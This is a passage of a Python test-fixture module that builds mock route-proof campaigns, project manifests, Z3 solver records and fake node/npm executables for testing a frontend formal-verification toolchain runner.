from __future__ import annotations

import base64
import copy
import importlib.util
import json
import os
import shutil
import stat
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch


REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
RUNNER_PATH = REPOSITORY_ROOT / "tooling/run_frontend_formal_toolchains.py"
SPEC = importlib.util.spec_from_file_location("frontend_formal_toolchains", RUNNER_PATH)
assert SPEC is not None and SPEC.loader is not None
runner = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = runner
SPEC.loader.exec_module(runner)


ASSUMPTIONS = [
    "The proof covers only the canonical bounded-navigation-v1 IR and ELMOS-emitted profile projects, not arbitrary customer source.",
    "TypeScript AST and the strict Dart base64 parser faithfully re-lift the bounded generated grammar.",
    "Route requiresAuth and deepLink values are observable metadata; identity enforcement and native deep-link dispatch are outside this bounded proof.",
    "Framework, compiler, router, browser, device, and runtime soundness are assumptions until independent real toolchain and journey evidence passes.",
    "SHA-256 is used for artifact identity and drift detection, not as the semantic equivalence proof rule.",
]


def model() -> dict[str, object]:
    return {
        "schemaVersion": "1.0",
        "profile": "bounded-navigation-v1",
        "projectTitle": "ELMOS bounded test",
        "navigation": {"label": "主要导航"},
        "render": {"mainRole": "main", "headingLevel": 1},
        "fallback": {"strategy": "FIRST_DECLARED_ROUTE"},
        "routes": [
            {
                "id": "route.home",
                "path": "/",
                "title": "Home",
                "text": "Home text",
                "requiresAuth": False,
                "deepLink": True,
            },
            {
                "id": "route.account",
                "path": "/account",
                "title": "Account",
                "text": "Account text",
                "requiresAuth": True,
                "deepLink": False,
            },
            {
                "id": "route.help",
                "path": "/help",
                "title": "Help",
                "text": "Help text",
                "requiresAuth": False,
                "deepLink": False,
            },
        ],
    }


def runtime_block_actual(block_id: str) -> dict[str, object]:
    values = {
        "route-navigation-deeplink-404": {
            "requestedPath": "/",
            "selectedRouteId": "route.home",
            "selectedPath": "/",
            "resolution": "DECLARED",
            "deepLink": True,
            "requiresAuth": False,
        },
        "component-template-view": {
            "componentId": "interaction.shell",
            "key": "route.home",
            "title": "Home",
            "text": "Home text",
            "visible": True,
        },
        "state-management": {
            "stateId": "bounded.counter",
            "before": 0,
            "after": 1,
            "saturated": False,
        },
        "action-event": {
            "event": "BOOT",
            "keyboardKey": "Enter",
            "handled": True,
            "action": "BOOT",
        },
        "effect-lifecycle": {
            "lifecycle": "MOUNT",
            "effect": "LOAD_ON_MOUNT",
            "executions": 1,
            "cleanup": False,
            "staleResponseIgnored": False,
        },
        "form-binding-validation": {
            "formId": "search",
            "fieldId": "query",
            "value": "",
            "submitted": False,
            "valid": False,
            "errorCode": None,
        },
        "api-network": {
            "operationId": "search",
            "called": False,
            "method": "POST",
            "path": "/api/search",
            "outcome": "NOT_CALLED",
            "canceled": False,
            "staleIgnored": False,
            "cacheKey": "tenant-a:",
        },
        "identity-permission": {
            "role": "ANONYMOUS",
            "permission": "search:execute",
            "permissionGranted": False,
            "tenantMatch": True,
            "authorized": True,
            "serverAuthorityRequired": True,
        },
        "rendering-hydration": {
            "mode": "HYDRATABLE_CSR",
            "requested": "MATCH",
            "status": "MATCHED",
            "duplicateEffects": False,
            "mismatchVisible": False,
        },
        "accessibility-focus": {
            "mainRole": "main",
            "headingLevel": 1,
            "formLabel": "搜索",
            "errorRole": None,
            "liveRegion": "polite",
            "keyboardSubmit": True,
            "focusTarget": None,
        },
        "i18n-theme-responsive": {
            "requestedLocale": "zh-CN",
            "locale": "zh-CN",
            "requestedTheme": "LIGHT",
            "theme": "LIGHT",
            "viewportWidth": 1024,
            "columns": 2,
        },
        "native-platform": {
            "boundary": "ADAPTER",
            "lifecycle": "FOREGROUND",
            "attempted": False,
            "permission": "GRANTED",
            "available": False,
            "outcome": "NOT_ATTEMPTED",
            "recovery": "FOREGROUND_RETRY",
        },
    }
    return values[block_id]


def runtime_scenario_input() -> dict[str, object]:
    return {
        "routePath": "/",
        "event": "BOOT",
        "keyboardKey": "Enter",
        "counterBefore": 0,
        "incrementCount": 1,
        "lifecycle": "MOUNT",
        "query": "",
        "networkResult": "NONE",
        "authenticated": False,
        "permissionGranted": False,
        "tenantId": "tenant-a",
        "resourceTenantId": "tenant-a",
        "hydration": "MATCH",
        "locale": "zh-CN",
        "theme": "LIGHT",
        "viewportWidth": 1024,
        "nativeLifecycle": "FOREGROUND",
        "nativePermission": "GRANTED",
        "nativeAvailable": False,
        "deepLinkPath": None,
    }


def runtime_block_measurement(
    block_id: str, scenario_id: str = "SCENARIO_ACTUAL"
) -> dict[str, object]:
    keyboard_event = {
        "type": "keydown",
        "key": "Enter",
        "target": {
            "attributes": {"data-run-scenario": scenario_id},
        },
    }
    values = {
        "route-navigation-deeplink-404": {
            "page_url": "http://127.0.0.1:4173/",
            "active_route_attributes": {
                "data-route-id": "route.home",
                "data-route-path": "/",
                "data-deep-link": "true",
                "data-requires-auth": "false",
            },
            "declared_routes": [
                {
                    "route_id": "route.home",
                    "route_path": "/",
                    "deep_link": True,
                    "requires_auth": False,
                },
                {
                    "route_id": "route.account",
                    "route_path": "/account",
                    "deep_link": False,
                    "requires_auth": True,
                },
            ],
        },
        "component-template-view": {
            "heading": "Home",
            "text": "Home text",
            "visibility": True,
            "attributes": {
                "id": "main",
                "data-route-id": "route.home",
                "data-elmos-active-component": "true",
                "data-elmos-component-id": "interaction.shell",
                "data-elmos-component-key": "route.home",
            },
        },
        "state-management": {
            "state_measurement": {
                "data-elmos-state-id": "bounded.counter",
                "data-elmos-before": "0",
                "data-elmos-after": "1",
                "data-elmos-saturated": "false",
            }
        },
        "action-event": {
            "captured_events": [
                {
                    "type": "click",
                    "target": {"attributes": {"data-run-scenario": scenario_id}},
                }
            ],
            "outcome_attributes": {
                "data-elmos-event-outcome": "BOOT",
                "data-elmos-keyboard-key": "Enter",
                "data-elmos-handled": "true",
                "data-elmos-action": "BOOT",
            },
        },
        "effect-lifecycle": {
            "ordered_events": [
                {
                    "lifecycle": "MOUNT",
                    "effect": "LOAD_ON_MOUNT",
                    "executions": "1",
                    "cleanup": "false",
                    "stale_response_ignored": "false",
                }
            ]
        },
        "form-binding-validation": {
            "control": {"form_id": "search", "field_id": "query", "value": ""},
            "validity_state": {"submitted": False, "valid": False},
            "error_dom": {"error_code": None},
            "active_element": {"focus_target": None},
        },
        "api-network": {
            "network_events": [],
            "application_markers": {
                "operation_id": "search",
                "called": "false",
                "method": "POST",
                "path": "/api/search",
                "outcome": "NOT_CALLED",
                "canceled": "false",
                "stale_ignored": "false",
                "cache_key": "tenant-a:",
            },
        },
        "identity-permission": {
            "adapter_events": [{"kind": "AUTHORITY_DECISION", "result": "ALLOW"}],
            "decision_attributes": {
                "role": "ANONYMOUS",
                "permission": "search:execute",
                "permission_granted": "false",
                "tenant_match": "true",
                "authorized": "true",
                "server_authority_required": "true",
            },
        },
        "rendering-hydration": {
            "server_markup_digest": "sha256:" + "1" * 64,
            "hydration_warnings": [],
            "mutations": [],
            "effect_count": 1,
            "hydration_state": {
                "mode": "HYDRATABLE_CSR",
                "requested": "MATCH",
                "status": "MATCHED",
                "duplicate_effects": "false",
                "mismatch_visible": "false",
            },
        },
        "accessibility-focus": {
            "aria_snapshot": '- main:\n  - heading "Home" [level=1]',
            "axe_results": {"violations": []},
            "active_element": {
                "tag": "button",
                "attributes": {"data-run-scenario": scenario_id},
            },
            "keyboard_events": [keyboard_event],
            "accessibility_state": {
                "main_role": "main",
                "heading_level": 1,
                "form_label": "搜索",
                "error_role": None,
                "live_region": "polite",
                "focus_target": None,
                "keyboard_submit": True,
            },
        },
        "i18n-theme-responsive": {
            "html_lang": "zh-CN",
            "translated_text": {"requested_locale": "zh-CN", "text": "搜索结果"},
            "computed_theme_tokens": {
                "requested_theme": "LIGHT",
                "theme": "LIGHT",
            },
            "layout_measurement": {
                "viewport_width": 1024,
                "columns": 2,
                "computed_grid_template_columns": "500px 500px",
                "bounding_box": {"x": 12, "y": 24, "width": 1000, "height": 40},
            },
        },
        "native-platform": {
            "semantics": {
                "boundary": "ADAPTER",
                "attempted": False,
                "available": False,
                "outcome": "NOT_ATTEMPTED",
                "recovery": "FOREGROUND_RETRY",
            },
            "lifecycle": "FOREGROUND",
            "permission": "GRANTED",
            "adapter_events": [{"kind": "NATIVE_ADAPTER", "attempted": False}],
            "device_identity": {"device_id": "bounded-test-device"},
        },
    }
    return copy.deepcopy(values[block_id])


def runtime_driver_contract(profile_id: str = "react") -> dict[str, object]:
    channels = runner.required_runtime_channels(profile_id)
    browser_dom = profile_id not in {"flutter", "harmony-arkui"}
    model_digest = "sha256:" + "9" * 64
    block_contracts = {
        block_id: {
            "observer_kind": runner.BLOCK_OBSERVER_SPECS[block_id][
                "observer_kind"
            ],
            "measurement_surface": runner.BLOCK_OBSERVER_SPECS[block_id][
                "measurement_surface"
            ],
            "browser_status": (
                "NOT_RUN"
                if block_id in runner.WEB_BROWSER_MANDATORY_NOT_RUN_BLOCK_IDS
                else "PASSED"
            ),
            "browser_reason": f"{block_id} browser observer contract",
            "native_status": (
                "NOT_RUN"
                if block_id in runner.NATIVE_MANDATORY_NOT_RUN_BLOCK_IDS
                else "PASSED"
            ),
            "native_reason": (
                runner.NATIVE_API_NOT_RUN_REASON
                if block_id == "api-network"
                else f"{block_id} native observer contract"
            ),
        }
        for block_id in runner.INTERACTION_BLOCK_IDS
    }
    scenario_rows = []
    for scenario_id in runner.LOCKED_INTERACTION_SCENARIO_IDS:
        blocks = {
            block_id: runtime_block_actual(block_id)
            for block_id in runner.INTERACTION_BLOCK_IDS
        }
        scenario_rows.append(
            {
                "scenario_id": scenario_id,
                "blocks": blocks,
                "block_digests": {
                    block_id: runner.digest_json(actual)
                    for block_id, actual in blocks.items()
                },
            }
        )
    projection = {
        "schema_version": "1.0",
        "kind": "bounded-interaction-channel-projection-contract",
        "projection": "STRICT_RUNTIME_OBSERVATION_V1",
        "model_digest": model_digest,
        "block_actual_keys": {
            block_id: list(runtime_block_actual(block_id))
            for block_id in runner.INTERACTION_BLOCK_IDS
        },
        "scenario_ids": list(runner.LOCKED_INTERACTION_SCENARIO_IDS),
        "channels": {
            channel: {
                "status": "NOT_RUN",
                "native_execution_allowed": channel != "browser",
                "scenarios": copy.deepcopy(scenario_rows),
            }
            for channel in channels
        },
        "oracle_provenance": "SAME_PRODUCER_CHANNEL_PROJECTION_NOT_INDEPENDENT",
        "arbitrary_customer_runtime": "NOT_PROVED",
    }
    return {
        "schema_version": "1.0",
        "kind": (
            "bounded-interaction-framework-browser-driver-contract"
            if browser_dom
            else "bounded-interaction-native-semantics-driver-contract"
        ),
        "framework_binding": runner.RUNTIME_FRAMEWORK_BINDINGS[profile_id],
        "runtime_evidence_eligibility": "ELIGIBLE_LOCAL_ACTUAL_RUNTIME_EXECUTION",
        "runtime_status": "NOT_RUN",
        "independent_runtime_oracle": "NOT_RUN",
        "customer_runtime_evidence": "NOT_RUN",
        "certification": "NOT_CERTIFIED",
        "required_runtime_channels": list(channels),
        "observer_protocol": runner.BLOCK_OBSERVER_CONTRACT,
        "actual_source": runner.BLOCK_SPECIFIC_RUNTIME_ACTUAL_SOURCE,
        "self_reported_reducer_json_allowed": False,
        "legacy_runtime_observed_allowed": False,
        "declaration_payload_allowed_keys": [
            "schema_version",
            "kind",
            "block_id",
            "status",
            "observer_kind",
            "measurement_surface",
            "reason",
        ],
        "block_observer_contracts": block_contracts,
        "browser_required_not_run_blocks": list(
            runner.WEB_BROWSER_MANDATORY_NOT_RUN_BLOCK_IDS
        ),
        "native_required_not_run_blocks": list(
            runner.NATIVE_MANDATORY_NOT_RUN_BLOCK_IDS
        ),
        "native_route_without_real_device_channel_status": "NOT_RUN",
        "root_selector": (
            '#elmos-interaction[data-proof-profile="bounded-frontend-interaction-v1"]'
            '[data-observer-protocol="block-specific-runtime-observation-v1"]'
            if browser_dom
            else "NOT_APPLICABLE"
        ),
        "ready_selector": (
            '#elmos-interaction[data-elmos-ready="true"]'
            '[data-observer-protocol="block-specific-runtime-observation-v1"]'
            if browser_dom
            else "NOT_APPLICABLE"
        ),
        "scenario_row_selector_template": (
            '[data-scenario-id="${scenario_id}"]'
            if browser_dom
            else "NOT_APPLICABLE"
        ),
        "scenario_action_selector_template": (
            '[data-run-scenario="${scenario_id}"]'
            if browser_dom
            else "NOT_APPLICABLE"
        ),
        "runtime_source_attribute": (
            "data-runtime-source" if browser_dom else "SEMANTICS_LABEL"
        ),
        "runtime_source_value": runner.BLOCK_SPECIFIC_RUNTIME_ACTUAL_SOURCE,
        "completion_attribute": (
            "data-execution-state" if browser_dom else "SEMANTICS_LABEL"
        ),
        "completion_value": (
            "PARTIAL"
            if browser_dom
            else "PARTIAL_OR_COMPLETE_FROM_BLOCK_STATUSES"
        ),
        "sequence_attribute": (
            "data-execution-sequence" if browser_dom else "SEMANTICS_LABEL"
        ),
        "query_selector": (
            "#elmos-query" if browser_dom else "ValueKey(elmos-query)"
        ),
        "block_selector_template": (
            '[data-semantic-block="${block_id}"]'
            if browser_dom
            else "ValueKey(block:${scenario_id}:${block_id})"
        ),
        "network_intercept_path": (
            "/api/search" if "browser" in channels else "ADAPTER_TRACE"
        ),
        "channel_projection_contract": projection,
        "channel_projection_contract_digest": runner.digest_json(projection),
        "native_adapter_evidence": "NOT_RUN",
        "browser_or_device_evidence": "NOT_RUN",
    }


def json_bytes(value: object) -> bytes:
    return (json.dumps(value, ensure_ascii=False, indent=2) + "\n").encode()


def write_json(path: Path, value: object) -> str:
    data = json_bytes(value)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return runner.sha256_bytes(data)


def locked_z3_path() -> Path:
    candidate = shutil.which("z3")
    if candidate is None:
        raise RuntimeError("the locked Z3 4.16.0 binary is required by this suite")
    path = Path(candidate).resolve(strict=True)
    if runner.sha256_bytes(path.read_bytes()) != runner.LOCKED_Z3_BINARY_SHA256:
        raise RuntimeError("the local Z3 binary does not match the locked digest")
    return path


def navigation_path(profile_id: str) -> str:
    if profile_id == "flutter":
        return "lib/elmos_bounded_navigation.dart"
    if profile_id == "harmony-arkui":
        return "entry/src/main/ets/elmos-bounded-navigation.ets"
    if profile_id == "vue2":
        return "src/elmos-bounded-navigation.js"
    return "src/elmos-bounded-navigation.ts"


def navigation_source(profile_id: str, value: object) -> str:
    if profile_id == "flutter":
        encoded = base64.b64encode(
            json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode()
        ).decode()
        return (
            "// Generated executable proof boundary for bounded-navigation-v1.\n"
            f"const String elmosBoundedNavigationBase64 = {json.dumps(encoded)};\n"
        )
    suffix = ";" if profile_id == "vue2" else " as const;"
    return (
        "// Generated executable proof boundary for bounded-navigation-v1.\n"
        "export const ELMOS_BOUNDED_NAVIGATION = "
        + json.dumps(value, ensure_ascii=False, indent=2)
        + suffix
        + "\n"
    )


def make_project_files(profile_id: str, value: dict[str, object]) -> dict[str, str]:
    expected = runner.EXPECTED_PROFILES[profile_id]
    files = {navigation_path(profile_id): navigation_source(profile_id, value)}
    if expected["kind"] == "node":
        package_expected = runner.EXPECTED_NODE_PACKAGES[profile_id]
        files.update(
            {
                "package.json": json.dumps(
                    {
                        "name": f"test-{profile_id}",
                        "version": "0.1.0",
                        "private": True,
                        "type": "module",
                        "engines": {"node": "26.0.0"},
                        "packageManager": "npm@11.12.1",
                        "scripts": package_expected["scripts"],
                        "dependencies": package_expected["dependencies"],
                        "devDependencies": package_expected["devDependencies"],
                    },
                    indent=2,
                )
                + "\n",
                ".nvmrc": "26.0.0\n",
                ".npmrc": "save-exact=true\npackage-lock=true\nengine-strict=true\nfund=false\naudit=true\n",
            }
        )
    elif expected["kind"] == "flutter":
        files.update(
            {
                ".fvmrc": '{\n  "flutter": "3.44.1"\n}\n',
                "pubspec.yaml": "name: frontend_formal_fixture\nenvironment:\n  sdk: 3.12.1\n",
            }
        )
    else:
        files[".elmos-harmony-runner.json"] = (
            json.dumps(
                {
                    "schemaVersion": "1.0",
                    "sdk": "6.0.0(20)",
                    "apiLevel": 20,
                    "runnerProfile": "harmonyos-6.0.0-api20",
                    "signing": "NOT_RUN",
                    "deviceEvidence": "NOT_RUN",
                },
                indent=2,
            )
            + "\n"
        )
    content_digest = runner.digest_json(files)
    files["elmos.ui-migration.json"] = (
        json.dumps(
            {
                "schemaVersion": "1.0",
                "direction": {"source": "fixture", "target": profile_id},
                "targetProfile": {
                    "id": profile_id,
                    "frameworkVersion": expected["framework_version"],
                    "platforms": expected["platforms"],
                },
                "digestScope": "all generated files except elmos.ui-migration.json",
                "contentDigest": content_digest,
                "verification": {
                    "dependencyLock": "NOT_RUN",
                    "targetBuild": "NOT_RUN",
                    "targetStartup": "NOT_RUN",
                    "browserOrDeviceJourney": "NOT_RUN",
                    "accessibility": "NOT_RUN",
                    "visualParity": "NOT_RUN",
                    "holdout": "NOT_RUN",
                    "certification": "NOT_CERTIFIED",
                },
            },
            indent=2,
        )
        + "\n"
    )
    return files


class CampaignFixture:
    def __init__(self, root: Path) -> None:
        self.root = root
        self.path = root / "frontend-formal-route-campaign.json"
        self.model = model()
        self.model_digest = runner.digest_json(self.model)
        self.z3_path = locked_z3_path()
        self.profiles: list[dict[str, object]] = []
        self.profile_files: dict[str, dict[str, str]] = {}
        self.routes: list[dict[str, object]] = []
        self._create_profiles()
        self._create_routes()
        self.data = {
            "schema_version": "1.0",
            "kind": "frontend-formal-route-campaign",
            "proof_profile": "bounded-navigation-v1",
            "corpus_id": "frontend-bounded-navigation-corpus-v1",
            "profile_count": 9,
            "route_count": 72,
            "profiles": self.profiles,
            "source_liftings": [
                {
                    "profile_id": profile["profile_id"],
                    "project_digest": profile["project_digest"],
                    "relift_model_digest": profile["relift_model_digest"],
                    "status": "PASSED",
                }
                for profile in self.profiles
            ],
            "target_lowerings": [
                {
                    "profile_id": profile["profile_id"],
                    "project_digest": profile["project_digest"],
                    "emitted_project": "PASSED",
                    "relift": "PASSED",
                }
                for profile in self.profiles
            ],
            "routes": self.routes,
            "counts": {
                "PROVED_UNDER_ASSUMPTIONS": 72,
                "REFUTED": 0,
                "NOT_PROVED": 0,
            },
            "semantic_blocks": {
                "proved": ["bounded-navigation-v1"],
                "externally_composable_not_run": [
                    "component-dialect-engine/certified-component-v1"
                ],
                "unsupported_not_proved": ["state", "action", "effect"],
            },
            "assumptions": ASSUMPTIONS,
            "arbitrary_customer_source": "NOT_PROVED",
            "unconditional_proof": False,
            "native_build_and_runtime": "NOT_RUN",
            "independent_external_verification": "NOT_RUN",
            "certification": "NOT_CERTIFIED",
        }
        self.write_campaign()

    def write_campaign(self) -> None:
        write_json(self.path, self.data)

    def _create_profiles(self) -> None:
        for profile_id in sorted(runner.EXPECTED_PROFILES):
            expected = runner.EXPECTED_PROFILES[profile_id]
            files = make_project_files(profile_id, self.model)
            self.profile_files[profile_id] = files
            project_path = self.root / "profiles" / profile_id / "project"
            for relative, content in files.items():
                destination = project_path / relative
                destination.parent.mkdir(parents=True, exist_ok=True)
                destination.write_text(content, encoding="utf-8")
            project_digest = runner.digest_json(dict(sorted(files.items())))
            file_rows = []
            for relative, content in sorted(files.items()):
                data = content.encode()
                file_rows.append(
                    {
                        "path": relative,
                        "sha256": runner.sha256_bytes(data),
                        "byte_count": len(data),
                    }
                )
            manifest_base = {
                "schema_version": "1.0",
                "kind": "frontend-formal-profile-project",
                "profile_id": profile_id,
                "framework_version": expected["framework_version"],
                "platforms": expected["platforms"],
                "project_path": "project",
                "project_digest": project_digest,
                "digest_scope": "sorted UTF-8 project files keyed by POSIX relative path",
                "file_count": len(file_rows),
                "files": file_rows,
            }
            manifest_digest = runner.digest_json(manifest_base)
            manifest = {**manifest_base, "manifest_digest": manifest_digest}
            write_json(self.root / "profiles" / profile_id / "manifest.json", manifest)
            self.profiles.append(
                {
                    "profile_id": profile_id,
                    "framework_version": expected["framework_version"],
                    "platforms": expected["platforms"],
                    "project_path": f"profiles/{profile_id}/project",
                    "project_digest": project_digest,
                    "manifest_path": f"profiles/{profile_id}/manifest.json",
                    "manifest_digest": manifest_digest,
                    "navigation_source_path": navigation_path(profile_id),
                    "relift_model_digest": self.model_digest,
                    "target_build": "NOT_RUN",
                }
            )

    def _traced(
        self, name: str, observations: list[dict[str, object]]
    ) -> dict[str, object]:
        return {
            "runtime_kind": name.upper(),
            "observations": [
                {"trace_id": f"{name}:{index}", **observation}
                for index, observation in enumerate(observations)
            ],
        }

    def _create_routes(self) -> None:
        profiles = {profile["profile_id"]: profile for profile in self.profiles}
        expected_observations = runner.expected_behavior_observations(self.model)
        for source_id in sorted(profiles):
            for target_id in sorted(profiles):
                if source_id == target_id:
                    continue
                route_id = f"{source_id}--to--{target_id}"
                prefix = f"routes/{route_id}/"
                route_root = self.root / "routes" / route_id
                behavior = {
                    "schema_version": "1.0",
                    "domain": {
                        "id": "bounded-navigation-domain-v1",
                        "operations": [
                            "INITIAL_RENDER",
                            "SELECT_DECLARED_PATH",
                            "SELECT_UNKNOWN_PATH",
                        ],
                        "unknown_path_policy": "FIRST_DECLARED_ROUTE",
                        "framework_native_runtime": "NOT_RUN",
                    },
                    "canonical": self._traced("canonical", expected_observations),
                    "independent": self._traced("independent", expected_observations),
                    "source": self._traced("source", expected_observations),
                    "target": self._traced("target", expected_observations),
                    "equivalent": True,
                    "native_browser_or_device_evidence": "NOT_RUN",
                }
                behavior_digest = write_json(route_root / "behavior.json", behavior)
                source_content = self.profile_files[source_id][
                    navigation_path(source_id)
                ].encode()
                target_content = self.profile_files[target_id][
                    navigation_path(target_id)
                ].encode()
                chunk_rows = []
                for pointer, subtree in runner.json_pointer_rows(self.model).items():
                    subtree_digest = runner.digest_json(subtree)
                    chunk_rows.append(
                        {
                            "pointer": pointer,
                            "pointer_standard": "RFC6901",
                            "source": {
                                "path": navigation_path(source_id),
                                "start_byte": 0,
                                "end_byte": len(source_content),
                                "content_hash": runner.sha256_bytes(source_content),
                                "subtree_hash": subtree_digest,
                            },
                            "target": {
                                "path": navigation_path(target_id),
                                "start_byte": 0,
                                "end_byte": len(target_content),
                                "content_hash": runner.sha256_bytes(target_content),
                                "subtree_hash": subtree_digest,
                            },
                            "canonical_subtree_hash": subtree_digest,
                            "source_subtree_hash": subtree_digest,
                            "target_subtree_hash": subtree_digest,
                            "equivalent": True,
                        }
                    )
                chunks = {
                    "schema_version": "1.0",
                    "route_id": route_id,
                    "chunks": chunk_rows,
                    "equivalent": True,
                }
                chunks_digest = write_json(route_root / "chunks.json", chunks)
                composition = {
                    "schema_version": "1.0",
                    "route_id": route_id,
                    "source_lifting": {
                        "profile_id": source_id,
                        "project_digest": profiles[source_id]["project_digest"],
                        "model_digest": self.model_digest,
                    },
                    "target_lowering_relift": {
                        "profile_id": target_id,
                        "project_digest": profiles[target_id]["project_digest"],
                        "model_digest": self.model_digest,
                    },
                    "canonical_model_digest": self.model_digest,
                    "semantic_equal": True,
                    "chunk_equal": True,
                    "behavior_equal": True,
                    "solver_outcome": "UNSAT",
                    "status": "PROVED_UNDER_ASSUMPTIONS",
                }
                composition_digest = write_json(
                    route_root / "composition.json", composition
                )
                smt_data = b"(set-logic ALL)\n(assert false)\n(check-sat)\n"
                (route_root / "proof.smt2").write_bytes(smt_data)
                smt_digest = runner.sha256_bytes(smt_data)
                formal = {
                    "schema_version": "1.0",
                    "kind": "frontend-bounded-navigation-formal-input",
                    "corpus_id": "frontend-bounded-navigation-corpus-v1",
                    "proof_profile": "bounded-navigation-v1",
                    "proof_scope": "fixture",
                    "route_id": route_id,
                    "tuple": {
                        "source_profile": source_id,
                        "source_framework_version": profiles[source_id][
                            "framework_version"
                        ],
                        "target_profile": target_id,
                        "target_framework_version": profiles[target_id][
                            "framework_version"
                        ],
                    },
                    "source_project_digest": profiles[source_id]["project_digest"],
                    "target_project_digest": profiles[target_id]["project_digest"],
                    "canonical_model": self.model,
                    "canonical_model_digest": self.model_digest,
                    "source_model_digest": self.model_digest,
                    "target_model_digest": self.model_digest,
                    "semantic_equal": True,
                    "behavior_digest": behavior_digest,
                    "behavior_equal": True,
                    "chunk_digest": chunks_digest,
                    "chunk_equal": True,
                    "assumptions": ASSUMPTIONS,
                    "semantic_blocks": {
                        "proved": ["bounded-navigation-v1"],
                        "externally_composable_not_run": [],
                        "unsupported_not_proved": ["state"],
                    },
                    "arbitrary_customer_source": "NOT_PROVED",
                    "compiler_framework_runtime_soundness": "ASSUMED_NOT_PROVED",
                }
                formal_digest = write_json(route_root / "formal-input.json", formal)
                solver = {
                    "schema_version": "1.0",
                    "solver": str(self.z3_path),
                    "solver_binary_realpath": str(self.z3_path),
                    "solver_binary_sha256": runner.LOCKED_Z3_BINARY_SHA256,
                    "solver_version": runner.LOCKED_Z3_VERSION,
                    "identity_status": "VERIFIED",
                    "invocation": [str(self.z3_path), "-in"],
                    "options": {"args": ["-in"], "timeout_ms": 10_000},
                    "environment": {
                        "platform": runner.node_platform_name(),
                        "arch": runner.node_arch_name(),
                        "node_version": "v26.0.0",
                    },
                    "exit_code": 0,
                    "stdout": "unsat\n",
                    "stderr": "",
                    "outcome": "UNSAT",
                    "proof_status": "PROVED_UNDER_ASSUMPTIONS",
                    "unconditional_proof": False,
                    "route_id": route_id,
                    "formal_input_digest": formal_digest,
                    "solver_input_digest": smt_digest,
                    "smt2_digest": smt_digest,
                }
                write_json(route_root / "solver-result.json", solver)
                layered = {
                    "schema_version": "1.0",
                    "kind": "frontend-bounded-navigation-layered-result",
                    "route_id": route_id,
                    "proof_profile": "bounded-navigation-v1",
                    "links": {
                        "formal_input_path": prefix + "formal-input.json",
                        "formal_input_digest": formal_digest,
                        "smt2_path": prefix + "proof.smt2",
                        "smt2_digest": smt_digest,
                        "solver_result_path": prefix + "solver-result.json",
                        "behavior_path": prefix + "behavior.json",
                        "behavior_digest": behavior_digest,
                        "chunks_path": prefix + "chunks.json",
                        "chunks_digest": chunks_digest,
                        "composition_path": prefix + "composition.json",
                        "composition_digest": composition_digest,
                    },
                    "layers": {
                        "emitted_source_relift": "PASSED",
                        "emitted_target_relift": "PASSED",
                        "semantic": "PASSED",
                        "chunk": "PASSED",
                        "behavior": "PASSED",
                        "smt_solver": "UNSAT",
                        "framework_native_build": "NOT_RUN",
                        "framework_native_runtime": "NOT_RUN",
                        "independent_external_verification": "NOT_RUN",
                    },
                    "status": "PROVED_UNDER_ASSUMPTIONS",
                    "unconditional_proof": False,
                    "certification": "NOT_CERTIFIED",
                    "assumptions": ASSUMPTIONS,
                }
                write_json(route_root / "layered-result.json", layered)
                self.routes.append(
                    {
                        "route_id": route_id,
                        "source_profile": source_id,
                        "target_profile": target_id,
                        "source_project_digest": profiles[source_id]["project_digest"],
                        "target_project_digest": profiles[target_id]["project_digest"],
                        "evidence_path": prefix + "layered-result.json",
                        "formal_input_path": prefix + "formal-input.json",
                        "formal_input_digest": formal_digest,
                        "solver_result_path": prefix + "solver-result.json",
                        "layered_result": "PROVED_UNDER_ASSUMPTIONS",
                        "status": "PROVED_UNDER_ASSUMPTIONS",
                    }
                )


def write_executable(path: Path, content: str) -> None:
    path.write_text(content, encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR)


def fake_toolchain(
    root: Path, *, node_version: str = "v26.0.0", chrome: bool = True
) -> tuple[Path, Path]:
    binary = root / "bin"
    binary.mkdir(parents=True)
    write_executable(
        binary / "node",
        f"""#!/usr/bin/env python3
import os, sys
if 'ELMOS_TEST_SECRET' in os.environ: raise SystemExit(91)
print({node_version!r})
""",
    )
    write_executable(
        binary / "npm",
        """#!/usr/bin/env python3
import html, json, os, sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit
if 'ELMOS_TEST_SECRET' in os.environ: raise SystemExit(91)
args = sys.argv[1:]
if args == ['--version']:
    print('11.12.1'); raise SystemExit(0)
if args and args[0] == 'install':
    package = json.loads(Path('package.json').read_text())
    lock = {'name': package['name'], 'lockfileVersion': 3, 'requires': True, 'packages': {'': {'name': package['name'], 'version': package['version'], 'dependencies': package['dependencies'], 'devDependencies': package['devDependencies']}}}
    Path('package-lock.json').write_text(json.dumps(lock) + '\\n'); raise SystemExit(0)
if args and args[0] == 'ci': raise SystemExit(0)
if len(args) >= 2 and args[:2] == ['run', 'test']: raise SystemExit(0)
if len(args) >= 2 and args[:2] == ['run', 'typecheck']: raise SystemExit(0)
if len(args) >= 2 and args[:2] == ['run', 'export:web']:
    Path('dist').mkdir(exist_ok=True); Path('dist/index.html').write_text('expo export\\n'); raise SystemExit(0)
if len(args) >= 2 and args[:2] == ['run', 'build']:
    Path('dist').mkdir(exist_ok=True); Path('dist/index.html').write_text('built\\n'); raise SystemExit(0)
if len(args) >= 2 and args[:2] == ['run', 'dev']:
    port = int(args[args.index('--port') + 1])
    routes = [('route.home', '/', 'Home', 'Home text', False, True), ('route.account', '/account', 'Account', 'Account text', True, False), ('route.help', '/help', 'Help', 'Help text', False, False)]
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            path = urlsplit(self.path).path
            route = next((item for item in routes if item[1] == path), routes[0])
            links = ''.join(f'<a href="{p}" data-route-id="{i}" data-requires-auth="{str(a).lower()}" data-deep-link="{str(d).lower()}">{html.escape(t)}</a>' for i,p,t,_x,a,d in routes)
            body = f'<html><body><nav aria-label="主要导航">{links}</nav><main data-route-id="{route[0]}" data-route-path="{route[1]}" data-requires-auth="{str(route[4]).lower()}" data-deep-link="{str(route[5]).lower()}"><h1>{html.escape(route[2])}</h1><p>{html.escape(route[3])}</p><p role="status">ready</p></main></body></html>'
            data = body.encode(); self.send_response(200); self.send_header('Content-Type', 'text/html; charset=utf-8'); self.send_header('Content-Length', str(len(data))); self.end_headers(); self.wfile.write(data)
        def log_message(self, *_args): pass
